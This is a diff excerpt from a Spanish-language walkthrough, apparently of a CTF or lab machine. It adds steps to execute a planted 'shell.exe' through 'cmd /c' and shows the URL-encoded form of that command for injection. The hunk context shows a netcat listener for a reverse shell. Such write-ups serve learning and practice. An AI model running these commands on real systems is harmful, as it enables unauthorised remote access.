@@ -212,4 +212,19 @@ rlwrap nc -lvnp 446
 
 ![TECH](images/tech/24.png)
 
-a
+Ahora toca ejecutar el archivo con:
+
+```bash
+cmd /c C:\Windows\Temp\shell.exe
+```
+
+pero encodeado queda:
+
+```bash
+cmd+%2Fc+C%3A%5CWindows%5CTemp%5Cshell.exe
+```
+
+![TECH](images/tech/26.png)
+
+
+![TECH](images/tech/27.png)
